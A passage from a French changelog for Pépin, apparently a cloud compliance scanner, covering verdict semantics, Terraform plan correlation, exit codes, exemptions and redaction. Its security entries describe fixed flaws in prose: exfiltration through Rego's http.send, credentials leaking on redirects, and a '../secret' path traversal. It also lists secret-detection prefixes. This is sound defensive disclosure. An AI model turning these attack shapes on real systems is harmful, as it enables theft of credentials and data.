  appels d'API qui alimentent la décision (la spec `collecte`, jointures comprises, plus les
  collecteurs Go partagés), les attributs décisifs, les conditions exactes d'un `pass` dans
  l'ordre où `assess.Build` les évalue, les tests qui l'éprouvent, et la date de la dernière
  validation live — qui affiche `jamais`, et dit pourquoi. Il lit le **même** instantané
  committé que la carte : deux calculs divergeraient, et celui qui diverge est celui qu'on lit.

### Modifié

- **Plans Terraform : une référence déclarée ferme la corrélation qui n'a jamais
  fonctionné.** Un plan ne peut pas connaître l'identifiant d'une ressource qu'il va
  créer — cet attribut n'est pas résolu, il est **absent**. Mesuré sur un tenant de
  référence construit depuis du HCL tiers : `vm_id`, `public_ip` et
  `security_group_ids` absents sur 5/5 VM, `security_group_id` sur 14/14 règles — tout
  ce sur quoi les règles se joignent. Le verdict restait honnête (`not-evaluated`,
  jamais un `pass`), mais aucun plan réel ne corrélait quoi que ce soit ; seuls les
  plans écrits à la main pour les tests le faisaient, où l'identifiant est un littéral.
  Le plan porte la relation ailleurs : `configuration` garde la référence que
  l'exploitant a écrite, et cette référence est une observation, pas une estimation
  (ADR-0022). Elle est suivie à travers les frontières de module, parce qu'à
  l'intérieur d'un module l'argument lit `var.x`. Une référence **ambiguë** — une
  déclaration démultipliée par `count` — ne résout rien : joindre la VM n° 0 au groupe
  de sécurité n° 1 serait un écart posé sur une ressource qui ne le porte pas.
- Un verdict bouge sur le corpus de référence : `compute_instance_has_security_group`
  passe de `not-evaluated` à `pass` sur outscale/terraform.
- **Le sujet d'un finding peut changer sur la source Terraform.** Une adresse résolue
  devient une identité, donc un descripteur dont l'`id:` lit un champ désormais comblé
  nomme la ressource qu'il désigne : sur un plan Scaleway, le sujet d'une ACL de bucket
  est le **bucket qu'elle configure** plutôt que la ressource ACL. C'est le sujet que
  l'on cherche, et il rejoint celui de la source live — mais **une dérogation écrite
  sur l'ancien sujet cesse de correspondre**.
- Les plans des tenants de référence portent désormais les `references` de leur
  `configuration`, et jamais ses `constant_value` — c'est là que vit un secret en dur.
  Une garde le tient sur le texte committé.
- **Les deux findings d'un réseau tout juste créé disent maintenant lequel vient de
  l'exploitant.** Sur un Net Outscale neuf, un scan live signalait un `high` sur le
  security group « default » — « porte une règle entrante » — et l'exploitant allait
  chercher une règle qu'il aurait écrite. La règle trouvée est celle que le provider crée
  avec le réseau : sa seule source admise est le groupe lui-même. L'écart subsiste (deux
  ressources démarrées sans SG explicite y atterrissent et communiquent librement, ce que
  CLD-NET-4 refuse), mais il nomme désormais la forme qu'il a trouvée et porte
  `confidence: contextual` au lieu de `confirmed`. La distinction est **observée**, pas
  déduite d'un CIDR absent : une règle entrante admet une source par CIDR **ou** par
  groupe, et la source par groupe est maintenant collectée
  (`peer_security_group_ids`). Là où le champ manque, la règle retombe sur la formulation
  générale et sur `confirmed` — ne pas savoir ne doit pas faire sortir un écart d'une
  porte de CI.
- **La sortie non restreinte est `contextual`, plus `confirmed`.** L'étiquette venait du
  constructeur partagé, dont la justification porte sur l'entrée : il n'existe pas de
  raison légitime d'ouvrir SSH à tout Internet. Cet argument ne vaut pas pour la sortie.
  Une sortie ouverte est un chemin d'exfiltration réel, mais des architectures
  défendables la laissent ouverte et filtrent en aval — passerelle, mandataire, pare-feu
  périmétrique — sur un plan que le scan ne voit pas. Le finding garde son code, sa
  sévérité `medium` et sa catégorie `security` ; il quitte `--gate security` sans quitter
  le rapport. **Le comportement par défaut ne bouge pas** : `--gate all` rend toujours `1`.
- Les messages d'exposition choisissent leur préposition selon la direction de la règle.
  Une règle sortante n'accepte rien « depuis » Internet, et un lecteur qui corrige ce que
  la phrase décrit cherchait au mauvais endroit.
- **La souveraineté se mesure désormais sur les ressources qui hébergent des données,
  et sur elles seules.** Le contrôle de localisation UE concluait depuis une *voisine* :
  une seule ressource portant une région ouvrait le `pass` à toutes les autres, y
  compris à des types que la règle n'examine jamais — un `iam_user` en `fr-par`
  certifiait une VM dont la région n'avait jamais été collectée. Une région ne compte
  comme observée que si chaque ressource du type la porte. **Verdict déplacé sur un
  tenant inchangé** : un tenant sans ressource localisée (réseaux, sous-réseaux,
  peering) passe de `pass` à `not-evaluated`, et un tenant partiellement localisé
  aussi.
- **Une jointure rompue ne se lit plus comme un écart.** La donnée décisive se déclare
  par type de ressource, si bien qu'un contrôle corrélant deux types se dégrade quand
  le *lien* manque, au lieu de conclure sans lui. `volume_id` non collecté sur les
  snapshots faisait paraître tous les volumes sans sauvegarde — un faux positif de
  masse, en `high`, causé par une lacune de collecte. **Verdict déplacé sur un tenant
  inchangé** : ces écarts deviennent `not-evaluated` en nommant le champ manquant. Un
  volume réellement sans snapshot, et un tenant sans aucune snapshot, échouent
  toujours.
- **Un écart déduit d'une absence que personne n'a cherchée est retiré.** Certaines
  règles concluent d'une absence, et elles ont raison — chez Scaleway un `ExpiresAt`
  nul *est* « aucune expiration ». Mais un champ non mappé est absent lui aussi, et les
  deux étaient indiscernables : `iam_accesskey_expiration_set` levait un `critical`
  dans les deux cas. L'assessment lit désormais la provenance, qui consigne ce qui a
  été **cherché**, et retire l'écart quand le champ n'a jamais été demandé
  ([ADR-0017](docs/adr/0017-provenance-atteste-une-recherche.md)). **Verdict déplacé
  sur un tenant inchangé**, dans un seul sens : une affirmation est retirée, jamais
  ajoutée. Un inventaire sans provenance — export d'un tiers — n'est pas touché.
- **La dette de véracité passe de 445 à 395 verdicts restant à prouver**, et les chemins
  entièrement prouvés de 5 à 23 sur 178. Les tenants de référence et les scénarios
  écrits à la main alimentent **un seul** registre : deux chiffres de couverture
  divergeraient, et celui qui diverge est celui qu'on lit. Un verdict de tenant ne
  compte que s'il est *substantiel* — `fail`, `pass` et `not-applicable` toujours,
  `not-evaluated` seulement si le tenant porte réellement une ressource du type visé.
  Sans ce filtre, les mêmes six tenants auraient payé 97 obligations au lieu de 50, la
  moitié par des absences.
- **Le plan d'un tenant ne garde plus que les attributs qu'un mapping lit vraiment.**
  Le réducteur coupait au niveau des sections et gardait tous les attributs de toutes
  les ressources : un `helm_release` embarquait donc son blob de valeurs Helm entier, un
  `kubectl_manifest` son `yaml_body`, un `kubernetes_secret` son contenu — rien de tout
  cela n'est lu par une règle commune. La réduction est désormais une liste blanche
  dérivée des descripteurs, descendue jusqu'au champ, et
  `TestNoReferenceTenantPlanCarriesAnAttributeNobodyReads` refuse le reste. **Aucun
  verdict ne bouge** : `internal/tfmap` n'a jamais projeté que les champs mappés. Le
  corpus passe de 54 Kio à 25 Kio.

## [0.3.0] - 2026-08-21

### Ajouté

- **Une session de collecte enregistrée, et la porte qui la rejoue.** Un descripteur
  de fournisseur déclare des endpoints ; rien ne prouvait que le collecteur les
  *émet*, ce qui est la forme exacte de l'incident des politiques EIM inline (règle
  juste, donnée qui n'arrivait jamais, aucun test Rego capable de le voir).
  `mise run trace` enregistre désormais une vraie collecte `--live` à travers un proxy
  d'interception, contre un **émulateur local** et sans **aucun identifiant cloud** ;
  l'enregistrement est versé dans `internal/genprovider/testdata/transcripts/`. Deux
  portes le rejouent à chaque build : `TestTheRecordedCollectionStillHappens` (moins
  d'appels que ce que l'enregistrement a vu, c'est une donnée qui a cessé d'arriver ;
  plus d'appels, c'est un endpoint déclaré mais jamais mesuré) et
  `TestEveryDeclaredEndpointIsObservedOrDeclaredUnobserved` (le registre
  `non_observes` est exact dans les deux sens). Le rejeu sert les réponses
  **enregistrées**, jamais des réponses dérivées de la spec qu'il éprouve : un harnais
  qui répondrait « ce que la spec attend » mesurerait sa propre copie de la spec et
  resterait vert sur un `items:` faux. Mesuré à la première session : aucun endpoint
  déclaré ne reste muet, sauf trois jointures enfants d'Outscale et une d'Exoscale
  dont la liste parente n'est pas servie par l'émulateur ou est revenue vide ;
  chacune est désormais consignée avec sa raison. Nouveau guide :
  [Tracer les appels réels](docs/guides/tracing-api-calls.fr.md). Aucune ligne de
  Pépin n'a changé, donc aucun endpoint de collecte n'est devenu surchargeable et
  aucune surface d'exfiltration n'a été créée.

- **Un contrat de véracité, et un compteur de dette plutôt qu'une matrice verte.**
  Pour chaque chemin contrôle × fournisseur × source, `internal/veracity` dérive les
  verdicts que ce chemin peut réellement atteindre — trois quand il sait conclure, un
  quand il ne peut pas lever le verrou du `pass`, un quand le contrat du fournisseur
  le déclare non applicable — et les compare aux scénarios committés, qui s'exécutent
  **contre le binaire**, sur toute la chaîne : des réponses d'API canned servies à la
  spec de collecte RÉELLE du descripteur, ou un plan Terraform minimal passé à son
  mapper réel. Ce qui n'est pas prouvé est consigné dans
  `internal/veracity/testdata/debt.txt`, une porte dans les deux sens : une
  obligation non prouvée absente du registre fait échouer la construction — **un
  contrôle ajouté sans ses scénarios ne peut donc pas passer** — et une ligne qui
  n'est plus due la fait échouer aussi. Les compteurs sont publiés dans
  `docs/known-limitations.fr.md`. Aujourd'hui : 178 chemins, 5 entièrement prouvés,
  458 obligations, 445 restantes. Une matrice de sept cents cas engendrés par gabarit
  serait verte et ne prouverait rien.

- **Une suite de dégradation avec une seule garantie : jamais un `pass`.** Un
  endpoint refusé, une jointure enfant refusée, une réponse partielle, un service
  indisponible, une réponse illisible, un attribut Terraform encore inconnu au stade
  du plan — chacun produit pour de vrai contre un serveur vivant ou un plan réel, et
  vérifié sur **tous** les contrôles qui lisent le type touché, pas sur un témoin
  choisi.

- **Un finding Terraform porte son origine : fichier, ligne, module.** `--format json`
  gagne `labels.tf_file`, `labels.tf_line` et `labels.tf_module` ; le résultat SARIF
  gagne un `physicalLocation` avec sa `region`, ce qui fait qu'une forge annote le bloc
  `resource` fautif plutôt que le fichier de plan. Le module se lit dans l'adresse de
  la ressource ; le fichier et la ligne sont **mesurés** dans les sources `.tf` posées à
  côté du plan, parce que `terraform show -json` ne porte ni l'un ni l'autre — vérifié
  dans la source de Terraform elle-même, où la représentation `configuration` d'une
  ressource contient `address`, `type`, `name`, `expressions`, et rien sur le document.
  Quand les sources sont absentes, que le module est distant ou que le même en-tête de
  bloc apparaît deux fois, l'origine est simplement absente : une ligne fausse envoie
  corriger le mauvais endroit, et on la croit. Sur une collecte live, la notion n'existe
  pas et aucun label n'est posé.

- **Les permissions minimales sont déclarées au descripteur, pas seulement en prose.**
  Chaque descripteur de fournisseur porte désormais un bloc `permissions:`, une entrée
  par unité de collecte : le droit dans le vocabulaire natif du fournisseur, la source
  officielle qui l'énonce, et s'il est **confirmé** ou encore **à vérifier**. Les pages
  de fournisseurs rendent ce bloc, si bien que le tableau que suit un lecteur et le
  droit que le scan nomme dans un motif de `not-evaluated` ne peuvent pas diverger.
  Quatre portes refusent l'omission silencieuse : une unité de collecte sans droit
  déclaré, une entrée orpheline, un état ou une source manquants, un droit non vérifié
  sans réserve écrite. Rien de tout cela n'est confirmé par un scan lancé avec un rôle
  délibérément réduit — ce dépôt ne détient aucun identifiant cloud — et chaque page
  le dit.

- **La complétude de la collecte est enregistrée, et elle déplace le verdict.** Chaque
  collecteur — le moteur déclaratif, le stockage objet, la chaîne des politiques EIM
  inline et le Kubernetes managé — consigne désormais, unité par unité, s'il a lu tout
  ce que l'API avait à rendre. Un endpoint refusé n'arrête plus le scan et ne disparaît
  plus dans un avertissement : l'inventaire porte un bloc `collection` (`attempted`,
  `complete`, une classe d'erreur stable, le `detail` du fournisseur), il est scellé
  dans le bundle de preuve, et il est publié par `--format json`. **Tout contrôle qui
  lit un type de ressource alimenté par une unité incomplète devient `not-evaluated`**,
  avec cette unité nommée comme motif — c'est l'assessment qui tranche, jamais une règle
  — et le scan rend **`3`, jamais `0`**. La transition est strictement directionnelle :
  un `pass` est retiré, un `fail` est conservé (un écart observé reste observé), un
  `not-applicable` est conservé (il vient du contrat, pas de la collecte). *Un verdict
  peut désormais bouger sur un tenant inchangé : un scan dont les identifiants ne
  peuvent pas lire une partie du périmètre rendait `0`, il rend `3` désormais.*

- **Un relevé de capacités, imprimé avant tout verdict.** Un scan live annonce ce qu'il
  a pu et n'a pas pu observer, unité par unité, avec la classe de chaque échec et le
  nombre de contrôles que cela coûte — ce nombre venant de la même fonction que celle
  qui dégrade l'assessment, si bien que le relevé ne peut pas promettre ce que le
  rapport ne tiendra pas. Hors collecte live, il n'apparaît que s'il a quelque chose à
  dire. Les types de ressources qu'un plan Terraform porte et qu'aucune spec ne projette
  y figurent aussi : ce n'est pas une incomplétude — aucun contrôle ne les lit, donc
  aucun verdict n'en dépend, et ils ne bloquent aucune porte — mais ils ne sont plus
  silencieux.

- **`exempted` : un cinquième statut d'assessment de premier rang, et des dérogations
  datées.** `scan --exceptions <fichier.yaml>` lit une politique de dérogations
  versionnée : `control`, `justification`, `expires_at`, `owner`, `approved_by`, les
  cinq obligatoires et tous validés au chargement. Un `fail` couvert par une entrée
  valide devient `exempted`, jamais `pass` : le finding reste dans `--format json`,
  dans le SARIF et dans le décompte par sévérité, `summary.conforme` reste faux, et le
  verdict annonce `NON CONFORME sous dérogation`. **Un nouveau code de sortie, `4`**,
  signifie « tout écart critical/high restant est couvert par une dérogation datée et
  attribuée » : non nul, donc rien ne passe en silence, et distinct, donc un pipeline
  qui l'accepte doit écrire le chiffre. Une dérogation expirée cesse de s'appliquer et
  le dit ; une dérogation qui nomme un contrôle ou un sujet inexistant est signalée
  comme orpheline ; les deux font échouer une porte `--strict`. Le bundle scelle
  `exemptions.json`, si bien que l'empreinte du dossier dépend de ce qu'il a écarté, et
  `verify --re-derive` rejoue la politique scellée à l'instant scellé.
  *Un statut et un code de sortie sont deux surfaces qu'un pipeline doit savoir lire.*

- **Chaque attribut de l'inventaire normalisé porte sa provenance.** À côté
  d'`attributes`, un index parallèle `provenance` dit, pour chaque attribut, d'où vient
  la valeur : `api` avec la requête **réellement servie**, `terraform-plan` avec le type
  de ressource du plan, ou `derived` pour un littéral de descripteur ou une valeur
  calculée localement, et si la source portait vraiment le champ. C'est un index
  parallèle et non une enveloppe autour de chaque valeur : les 59 règles Rego lisent
  `attributes.<nom>` sans changer, donc aucun verdict ne peut bouger (mesuré sur neuf
  fixtures × deux formats × deux langues : findings, statuts et codes de sortie
  identiques). `--format assessment` expose désormais, pour chaque contrôle ayant un
  attribut décisif, cet attribut et son attestation dans `evidence.attribute` /
  `evidence.source`. Cela rend visible, sans la changer, la situation de deux contrôles
  qui franchissent leur garde d'attribut grâce à une constante de descripteur plutôt
  qu'à une mesure.

- **L'inventaire normalisé est un contrat interne versionné.** `pepin-inventory/v1`,
  gelé dans `cmd/testdata/frozen/inventory.json` avec son enveloppe, la forme de sa
  ressource et le vocabulaire complet des types et attributs communs, dérivé des
  descripteurs et des collecteurs. La version voyage avec chaque bundle de preuve
  (`manifest.inventory_schema`), et une nouvelle page de référence dit ce qui est
  garanti et ce qui ne l'est pas. **Format de bundle `/v2`** (le manifeste porte le
  schéma d'inventaire et le résumé des dérogations), **surface CLI v3**
  (`--exceptions`, code de sortie 4).


- **Vague 3 de la documentation : le catalogue des contrôles est généré, et le
  projet s'explique.** Une page générée par contrôle sous `docs/controls/` (ce qu'il
  conclut, depuis quelle source, avec son motif quand il ne peut pas conclure), un
  guide de remédiation qui montre le même contrôle passer de `fail` à `pass` sur les
  plans d'exemple du dépôt, une page d'architecture qui argumente le choix central
  (un seul jeu de règles commun, la source est ce qui change d'un cloud à l'autre) et
  deux guides de contribution, ajouter un contrôle et ajouter un fournisseur, chacun
  terminé par une checklist utilisable telle quelle. Une `ROADMAP.md` publique
  remplace le document de travail interne qui vivait dans la documentation produit.

- **Exoscale est le premier fournisseur dont les preuves de remédiation déployables
  sont complètes** : 26 sur 26, ce qui porte le dépôt de 4 à 26 sur 95. Vingt modules
  Terraform autonomes, vérifiés par `terraform init -backend=false` et
  `terraform validate` contre le schéma réel du provider, plus deux notes documentées
  là où Terraform ne peut pas exprimer la correction (souveraineté du fournisseur,
  MFA d'un compte). `TestExoscaleRemediationCoverageStaysComplete` casse désormais la
  CI quand un contrôle exoscale arrive sans sa preuve ; les autres fournisseurs
  restent hors de cette garde jusqu'à ce qu'ils atteignent 100 %.

- **Vague 2 de la documentation produit : dix pages, générées partout où elles
  peuvent l'être.** Une référence CLI bâtie depuis la surface gelée et depuis de
  vraies exécutions de `--help`, le contrat des codes de sortie montré comme six
  exécutions avec le code que chacune a rendu, les cinq formats de sortie avec un
  document réel chacun, le plan contre le live avec deux divergences
  reproductibles, le cycle de vie du bundle de preuve (sceller, vérifier,
  re-dériver, altérer, caviarder) capturé de bout en bout, les intégrations
  GitHub Actions et GitLab CI dont les pipelines complets sont injectés depuis
  `examples/`, et une page par cloud souverain avec ses appels d'API et ses
  permissions minimales en lecture seule. `TestEveryPublicCLIFlagIsDocumented`
  échoue désormais quand un drapeau public manque à la référence CLI, dans l'une
  ou l'autre langue.

- Les exemples de CI publiés épinglent la **v0.2.0** et chaque action par SHA de
  commit. L'action des v0.1.0 et v0.1.1 n'installait rien du tout
  (`gh attestation verify` sans jeton) : ces tags ne doivent être épinglés par
  personne.

- **Les contrôles deviennent réglables, et un réglage assoupli ne garde pas son badge.**
  Quatre contrôles lisent désormais un fichier de politique : le profil d'étiquetage
  obligatoire, la fenêtre de fraîcheur et les états acceptés d'une snapshot, le seuil de
  détection de secrets. Chaque réglage est une poignée qui permet de fabriquer du vert :
  chaque correspondance normative du référentiel porte donc les **contraintes sous
  lesquelles elle vaut** (`config_requise`, quatre sens interprétables :
  `au_plus_le_defaut`, `superset_du_defaut`, `sous_ensemble_du_defaut`,
  `au_moins_aussi_strict_que_le_defaut`). Une
  configuration qui sort d'une contrainte fait **perdre au contrôle ses `references`**
  dans l'assessment — il cesse de prétendre couvrir CIS, ISO ou SecNumCloud — et
  l'assouplissement apparaît en cinq endroits à la fois : le terminal (`CONFIGURATION
  ASSOUPLIE`), les labels et la preuve de l'assessment, `--format json`
  (`config.relaxations`), le bandeau de verdict, et le bundle scellé (`config.json` plus
  une entrée `config` au manifeste, tous deux couverts par `checksums.txt`). Durcir un
  réglage n'est pas un assouplissement et n'est signalé nulle part. `mise run validate`
  refuse une contrainte qui nomme un réglage que le moteur de politique ne sait pas
  évaluer. Voir `docs/guides/control-configuration.fr.md`.

- **Un seul fichier de politique : `scan --policy`.** Il porte `controls:` (les réglages)
  et `exceptions:` (les dérogations, format inchangé). `--exceptions` reste le nom
  historique du même fichier et lit le même schéma : une invocation existante et un
  fichier existant continuent de fonctionner. Les deux drapeaux sont **mutuellement
  exclusifs**, parce que deux fichiers de politique sont deux fichiers qui divergeront.
  Surface CLI v4.

- **La détection de secrets porte un niveau de confiance.** Chaque finding de
  `compute_instance_no_secrets_in_user_data` publie `labels.confidence` : `high` pour un
  bloc PEM de clé privée, `medium` pour un préfixe reconnu au format attendu (`ghp_`,
  `AKIA`, `SCW`, `EXO`, `glpat-`, JWT), `low` pour une heuristique générique
  (`password=…`, `api_key=…`). Le seuil de signalement par défaut est `low` : tout est
  signalé, exactement comme avant. La valeur détectée n'apparaît toujours jamais, quel
  que soit le niveau, et cette propriété est désormais testée aux trois niveaux, sur le
  message et sur la remédiation, dans les deux langues.

- **L'inventaire évalué porte sa configuration.** L'enveloppe gagne `config`, la
  configuration effective des contrôles, à côté de `evaluated_at` — l'`input.json` d'un
  bundle scellé rejoue donc sous les réglages de son propre jour, et
  `verify --re-derive` reste fidèle sans qu'on lui redonne le fichier de politique.
  `--format json` publie `config.policy_digest` et `config.effective` sur **chaque**
  scan, le défaut compris : un lecteur doit pouvoir vérifier qu'un scan a tourné sous les
  réglages attendus, pas seulement constater qu'il n'a rien dit. Format de bundle v3.

### Modifié

- **`network_documented` vérifie enfin ce qu'il annonce.** La règle promettait
  propriétaire, projet et environnement, et évaluait `count(tags) > 0` : un unique
  `foo=bar` suffisait à déclarer un réseau documenté — une conformité affirmée sans avoir
  été mesurée. Elle exige désormais les étiquettes qui documentent réellement (par défaut
  `Owner, Project, Env`, configurables), et elle se tait quand l'attribut `tags` n'a pas
  été collecté, là où elle signalait un écart. Le **code est inchangé** : il voyage dans
  les `ruleId` SARIF, les assessments archivés et les fichiers de dérogations, où un
  renommage transformerait du jour au lendemain une dérogation valide en dérogation
  orpheline et ferait réapparaître l'écart qu'elle couvrait. Titre et description sont
  réécrits dans les deux langues.

- **La politique d'étiquetage obligatoire est configurable, et la comparaison est
  indifférente aux conventions.** `governance_resource_required_tags` n'exige plus quatre
  littéraux figés. La comparaison est insensible à la casse et aux séparateurs
  (`cost-center` ≡ `CostCenter`), et les alias élargissent chaque nom logique (`team`
  pour `Owner`, `environment` pour `Env`) : une organisation qui écrit `cost-center,
  application, environment, team` n'est plus signalée comme non gouvernée. Les types de
  ressources visés sont explicites et justifiés, et quatre types facturables entrent dans
  le périmètre — `blockstorage_snapshot`, `compute_image`, `managed_database`,
  `kubernetes_cluster` —, ce qui comble un faux négatif sur des services payants qui en
  étaient exclus. Le profil livré est documenté comme une **recommandation, pas comme une
  norme**.

- **Le contrôle de fraîcheur des snapshots dit ce qu'il mesure, et ce qu'il ne prouve
  pas.** `blockstorage_volume_snapshots_exist` vérifie désormais l'**état natif** de la
  snapshot en plus de sa date : une snapshot en `error`, `pending` ou `creating` ne compte
  plus comme une sauvegarde. Le délai est configurable (7 jours par défaut). Le titre
  devient « Absence de snapshot récente et terminée », et la description énonce
  franchement ce que le contrôle ne prouve pas — restaurabilité, complétude applicative,
  rétention, existence d'une politique de sauvegarde. Le code est inchangé, pour la même
  raison que ci-dessus. Ancré sur Outscale `Snapshot.State` et Exoscale
  `block-storage-snapshot.state`, désormais projetés par les collecteurs. L'inventaire
  normalisé gagne donc un attribut, ce qui est un changement de contrat : schéma
  d'inventaire v4, dont la note consigne aussi la clé d'enveloppe `config` ajoutée
  plus haut.

- **`--strict` refuse aussi une correspondance normative tombée.** Il refusait déjà une
  couverture nulle, des écarts medium/low restants et un fichier de dérogations périmé ;
  il rend maintenant `3` quand un réglage assoupli a coûté sa correspondance à un
  contrôle. Aucun nouveau code de sortie : l'incomplétude et l'assouplissement disent la
  même chose — ne lisez pas ce scan comme un feu vert — et les deux occupent déjà la
  place de `3`.

## [0.2.0] - 2026-08-19

### Ajouté

- **Pépin est bilingue, et détecte la langue.** Rapports, verdict, aide, erreurs
  et formats parsables (`json`, `sarif`, `oscal`, `assessment`) sortent en
  français ou en anglais. Ordre de résolution :
  `--lang=fr|en` → `PEPIN_LANG` → `LC_ALL` → `LANG` → repli `en` ; la première
  source non vide décide, et une locale inconnue retombe sur l'anglais sans
  erreur. Jusqu'ici l'ossature était anglaise et le contenu français : un lecteur
  recevait un rapport en deux langues dans la même phrase.
  Le français reste la langue de référence du contenu normatif : le référentiel
  et les règles s'écrivent en français d'abord, et là où une lecture juridique
  est en jeu, c'est la formulation française d'un contrôle qui fait foi.

- **Le projet a une marque.** `docs/assets/brand/` porte l'icône et les
  verrouillages en SVG et PNG, clair, sombre et monochrome, avec les générateurs
  qui les produisent (`scripts/generer-marque.py`,
  `scripts/generer-png-marque.py`) et les règles d'usage dans `docs/brand.fr.md`.
  Les deux README s'ouvrent dessus.

### Modifié

- **Schéma d'inventaire `pepin-inventory/v3`.** Une ressource gagne `source` (`file`,
  `line`, `module`), présent seulement là où il a pu être mesuré. Ajout pur.

- **Le code de sortie `3` s'élargit de « rien n'a été mesuré » à « le scan n'établit
  pas la conformité ».** Il se déclenche désormais aussi quand la collecte n'a pas pu
  lire une partie du périmètre visé. Délibérément pas de cinquième code : un code propre
  à l'incomplétude ne pourrait jamais primer sur `1` — masquer un écart critique réel au
  motif que le reste manque serait le faux vert que cette vague existe pour empêcher —
  il ne s'exprimerait donc que là où `3` s'exprime déjà. Ce qui distingue les situations
  reste lisible dans le relevé de capacités, dans le motif de chaque contrôle et dans la
  clé `collection`. *Un code de sortie est une surface que tout pipeline analyse.*

- **Schéma d'inventaire `pepin-inventory/v2`.** L'enveloppe gagne `collection`. Ajout
  pur — aucun champ existant ne bouge — mais un consommateur qui rejouerait un
  inventaire sans lire `collection` conclurait plus fermement que Pépin ne l'a fait, ce
  qui est exactement ce que ce champ existe pour empêcher. La version voyage dans
  `manifest.inventory_schema`.

- **La prose d'un finding change avec la langue, ses clés non.** Codes (`CLD-*`),
  identifiants de check, sévérités, statuts, sujets et codes de sortie sont
  identiques dans les deux langues ; titres, messages, remédiations et preuves
  sont traduits. Un pipeline qui compare le *texte* d'un rapport d'une exécution
  à l'autre doit figer `PEPIN_LANG`. Un pipeline adossé aux codes et aux statuts
  n'est pas affecté.
- **Un bundle scellé porte la langue du scan qui l'a produit.**
  `verify --re-derive` rejoue les règles dans les deux langues et accepte la
  concordance de l'une : vérifier un bundle français depuis un shell anglais
  n'est plus signalé comme une falsification. À noter : l'empreinte du bundle
  dépend bien de la langue, puisque la prose de l'assessment fait partie de ce
  qui est scellé.
- **Surface CLI v1 → v2** : ajout du drapeau persistant `--lang`. Ajout pur :
  aucun verbe, aucun autre drapeau ni aucun code de sortie ne bouge.


- **`docs/doc-cache-brief.md` sort de la documentation produit.** C'était un
  mémo de mainteneur s'adressant à une machine (« déjà téléchargée sur cette
  machine »), décrivant un cache qu'un clone ne peut pas avoir, lié de nulle
  part, et portant six chemins absolus vers un répertoire personnel. Ce qu'il
  contenait de précieux rejoint `references/docs/README.md`, à côté du
  `sources.yaml` qu'il décrit, dont le piège qui compte le plus : la
  documentation n'est pas le contrat.

### Corrigé

- **L'action publiée installe de nouveau.** La vérification de provenance
  ajoutée en 0.1.0 appelait `gh attestation verify` sans jeton ; `gh` refuse de
  tourner dans un workflow sans `GH_TOKEN`, si bien que l'installateur tenait
  tout binaire pour invérifiable et le refusait, chez tous les consommateurs, en
  0.1.0 comme en 0.1.1. L'action fournit désormais `github.token` elle-même :
  personne ne devrait avoir à câbler un jeton pour installer un binaire.

  L'angle mort mérite d'être nommé. Le job de pull request servait `install.sh`
  en boucle locale avec la vérification sautée, donc le chemin public n'était
  jamais exercé avant le job d'après-publication, c'est-à-dire après que le tag
  existe. Un job appelle maintenant l'action contre une version déjà publiée, à
  chaque pull request.

## [0.1.1] - 2026-08-19

### Corrigé

- **Une instance Scaleway dont le groupe de sécurité est créé par le même plan
  n'est plus rapportée `CRITICAL` « VM sans groupe de sécurité ».** Au stade
  plan, `security_group_id` est *unknown after apply*, donc absent de
  `planned_values` ; le transform `list` fabriquait alors une collection vide,
  qui satisfaisait la garde de capacité de la règle, celle-là même qui existe
  pour empêcher ce cas. Un transform de collection ne s'applique désormais que
  si la clé source existe réellement. « Absent » signifie que la source n'expose
  pas l'information ; « présent et vide » est une information.

  Cela change un verdict sur un tenant inchangé : sur un plan Terraform, le
  contrôle passe de `fail` à `non évalué`. Sur un plan, une instance réellement
  dépourvue de groupe de sécurité est indistinguable d'une instance dont le
  groupe n'est pas encore connu : Pépin le dit maintenant au lieu de deviner. Le
  chemin live en bénéficie aussi, où une API omettant une clé produisait le même
  `[]` fabriqué.

  Trouvé en rejouant quinze stacks Terraform de tiers contre le binaire.

- **La porte de non-dérive de la documentation compile désormais ce qu'elle
  mesure.** Elle réutilisait un `./pepin` déjà présent à la racine : un binaire
  périmé pouvait donc valider des pages périmées, ce qui est arrivé, la porte
  annonçant « à jour » pendant que la doc affichait encore le finding ci-dessus.

### Ajouté

- **Documentation produit, générée plutôt que recopiée.** Six pages en anglais
  avec leur contrepartie française synchronisée : un démarrage en cinq minutes
  sans compte cloud, le modèle d'assessment (`pass` / `fail` / `non applicable` /
  `non évalué`), la matrice de couverture providers × contrôles, les limites
  connues, la lecture commentée d'un scan réel, et le périmètre exact avec ses
  non-objectifs. Toute sortie de commande est capturée d'une exécution réelle du
  binaire, la matrice est calculée depuis le référentiel et les descripteurs de
  providers, et une porte de CI échoue dès que l'un des deux dérive.

- **Fuzzing des entrées non fiables** : `FuzzParsePlan` et `FuzzInventoryWalk`,
  couvrant le plan Terraform et l'export d'inventaire. Il a immédiatement trouvé
  une ressource au type vide entrant dans le modèle, désormais écartée et
  conservée en régression.

### Sécurité

- `SECURITY.md` lie désormais son canal de signalement privé au lieu de
  seulement le décrire.

## [0.1.0] - 2026-08-19

### Sécurité

- **Une politique chargée à chaud n'a plus accès au réseau.** `--policy-dir`
  compilait du Rego tiers avec les capacités par défaut d'OPA, `http.send`
  compris : une règle de huit lignes suffisait à POSTer l'inventaire évalué —
  user-data des instances, documents de politique IAM, policies de bucket — vers
  un hôte arbitraire, ou à balayer le réseau interne du runner depuis l'intérieur
  du scanner. Corrigé en amont dans `scankit v0.2.2` ; une politique appelant un
  de ces builtins ne compile plus. L'évaluation reçoit aussi une borne de cinq
  minutes.
- **Les identifiants fournisseur ne survivent plus à une redirection HTTP.** Go
  ne retire, en cross-domain, que `Authorization`, `Cookie` et
  `WWW-Authenticate` — ni `X-Auth-Token` (clé secrète Scaleway) ni
  `AccessKey`/`SecretKey` (Outscale). Une seule 302 vers un hôte contrôlé les
  livrait. Le client de collecte ne suit plus les redirections.
- **`pepin verify` ne lit plus hors de son bundle.** Les noms d'artefacts
  venaient du manifeste, fourni par le tiers audité : `../secret` faisait de la
  vérification un oracle d'existence et de contenu.
- **`--seal --redact` n'emporte plus les clés du tenant.** Le caviardage ne
  couvrait que les documents libres, alors qu'`access_key` est un attribut à part
  entière du modèle normalisé et que `password`/`certificate` remontent des bases
  managées.
- **Toolchain en Go 1.26.6**, qui annule cinq avis de la bibliothèque standard
  atteignables depuis ce code (`net/url`, `crypto/tls`, `encoding/xml`,
  `encoding/asn1`, `net/http`).
- **L'action publiée vérifie l'authenticité, pas seulement l'intégrité.** Le
  binaire et `checksums.txt` viennent de la même origine : qui peut remplacer les
  assets d'une release remplace les deux. `install.sh` vérifie désormais la
  provenance via `gh attestation verify`.

### Corrigé

Chaque point ci-dessous peut changer un verdict sur un tenant inchangé.

- **Un scan qui n'a rien mesuré ne rend plus `0`.** Identifiants expirés, droits
